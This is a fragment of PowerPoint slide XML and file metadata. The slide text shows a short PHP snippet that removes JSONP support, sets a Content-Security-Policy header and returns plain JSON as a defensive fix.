        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2655927" y="5345549"/>
            <a:ext cx="9318427" cy="1610558"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
          <a:ln/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" lIns="0" tIns="0" rIns="0" bIns="0" rtlCol="0" anchor="t"/>
          <a:lstStyle/>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&lt;?php</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 Remove JSONP support</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header("Content-Security-Policy: script-src 'self'");</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header("Content-Type: application/json");</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pP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 Return JSON only (no callback)</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$data = array('user' =&gt; 'admin', 'role' =&gt; 'admin');</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echo json_encode($data);</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="1050" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0" algn="l">
              <a:lnSpc>
                <a:spcPts val="1400"/>
              </a:lnSpc>
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="1050" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="2B4150"/>
                </a:solidFill>
                <a:highlight>
                  <a:srgbClr val="F2EFE8"/>
                </a:highlight>
                <a:latin typeface="Consolas" pitchFamily="34" charset="0"/>
                <a:ea typeface="Consolas" pitchFamily="34" charset="-122"/>
                <a:cs typeface="Consolas" pitchFamily="34" charset="-120"/>
              </a:rPr>
              <a:t>?&gt;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5317</Words>
  <Application>Microsoft Office PowerPoint</Application>
  <PresentationFormat>Custom</PresentationFormat>
  <Paragraphs>818</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MuseoModerno Light</vt:lpstr>
      <vt:lpstr>Arial</vt:lpstr>
      <vt:lpstr>Consolas</vt:lpstr>
      <vt:lpstr>MuseoModerno Medium</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2026-02-07T08:20:33Z</dcterms:created>
  <dcterms:modified xsi:type="dcterms:W3CDTF">2026-02-07T08:35:26Z</dcterms:modified>
</cp:coreProperties>
</file>